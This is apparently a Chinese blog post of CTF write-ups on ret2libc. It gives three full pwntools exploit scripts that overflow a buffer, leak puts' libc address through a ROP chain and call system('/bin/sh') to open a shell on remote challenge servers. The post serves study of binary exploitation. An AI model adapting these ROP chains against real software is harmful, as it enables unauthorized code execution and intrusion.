---
title: PWN入门-ret2libc做题
date: 2024-01-26 22:35:31
tags: PWN
mathjax: true
---

# PWN入门-ret2libc做题

## [2021 鹤城杯]babyof

将puts的got表地址传给rdi，返回到puts的plt表上，将puts的got表地址泄漏，最后再返回到main上。

libc查出bin/sh和system的相对偏移，再构造新利用链打。

可惜垃圾libcsearcher没有这个libc版本，得在线查。

```python
from pwn import *
from LibcSearcher import *
import struct
context(log_level='debug',os='linux',arch='amd64')
elf=ELF('./babyof')
p=remote("node4.anna.nssctf.cn",28930)
p.recvuntil("Do you know how to do buffer overflow?\n")
stack_overflow=b'a'*0x40+b'a'*8
ret_addr=p64(0x400506)
pop_rdi_ret_addr=p64(0x400743)
puts_got_addr=p64(elf.got["puts"])
puts_plt_addr=p64(elf.plt["puts"])
main_addr=p64(0x40066B)
payload1=flat([stack_overflow,ret_addr,pop_rdi_ret_addr,puts_got_addr,puts_plt_addr,main_addr])
p.sendline(payload1)
puts_real_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
p.recvuntil("Do you know how to do buffer overflow?\n")

#以下代码应该是正确的，但是libsearch里没有... 只能到https://libc.blukat.me/上查
# libc=LibcSearcher('puts',puts_real_addr)
# libc_addr=puts_real_addr-libc.dump('puts')
# bin_sh_addr=libc_addr+libc.dump("str_bin_sh")
# system_addr=libc_addr+libc.dump("system")

libc_addr=puts_real_addr-0x080aa0
bin_sh_addr=p64(libc_addr+0x1b3e1a)
system_addr=p64(libc_addr+0x04f550)

payload2=flat([stack_overflow,ret_addr,ret_addr,pop_rdi_ret_addr,bin_sh_addr,system_addr])
p.sendline(payload2)
p.interactive()
```

## [SWPUCTF 2021 新生赛]whitegive_pwn

```python
from pwn import *
from LibcSearcher import *
import struct
elf=ELF('./attachment')
p=remote("node4.anna.nssctf.cn",28437)
stack_overflow=b'a'*0x10+b'a'*8
ret_addr=p64(0x400509)
pop_rdi_ret_addr=p64(0x400763)
puts_got_addr=p64(elf.got["puts"])
puts_plt_addr=p64(elf.plt["puts"])
main_addr=p64(0x4006D6)
payload1=flat([stack_overflow,ret_addr,pop_rdi_ret_addr,puts_got_addr,puts_plt_addr,main_addr])
p.sendline(payload1)
puts_real_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc=LibcSearcher("puts",puts_real_addr) #ubuntu-glibc (id libc6_2.23-0ubuntu11.3_amd64)
libc_addr=puts_real_addr-libc.dump('puts')
system_addr=p64(libc_addr+libc.dump('system'))
bin_sh_addr=p64(libc_addr+libc.dump('str_bin_sh'))
payload2=flat([stack_overflow,ret_addr,pop_rdi_ret_addr,bin_sh_addr,system_addr])
p.sendline(payload2)
p.interactive()
```

## [CISCN 2019东北]PWN2

```python
from pwn import *
from LibcSearcher import *
import struct
context(log_level='debug',os='linux',arch='amd64')
elf=ELF('./attachment')
p=remote("node5.anna.nssctf.cn",28978)
stack_overflow=b'a'*0x58
pop_rdi_ret_addr=p64(0x400c83)
puts_got_addr=p64(elf.got["puts"])
puts_plt_addr=p64(elf.plt["puts"])
encrypt_addr=p64(elf.sym["encrypt"])
ret_addr=p64(0x4006b9)
payload1=flat([stack_overflow,pop_rdi_ret_addr,puts_got_addr,puts_plt_addr,encrypt_addr])
p.sendline("1")
p.recvuntil("Input your Plaintext to be encrypted")
p.sendline(payload1)
puts_real_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc=LibcSearcher("puts",puts_real_addr)
libc_addr=puts_real_addr-libc.dump("puts")
system_addr=p64(libc_addr+libc.dump("system"))
bin_sh_addr=p64(libc_addr+libc.dump("str_bin_sh"))
payload2=flat([stack_overflow,ret_addr,pop_rdi_ret_addr,bin_sh_addr,system_addr])
p.recvuntil("Input your Plaintext to be encrypted")
p.sendline(payload2)
p.interactive()
```
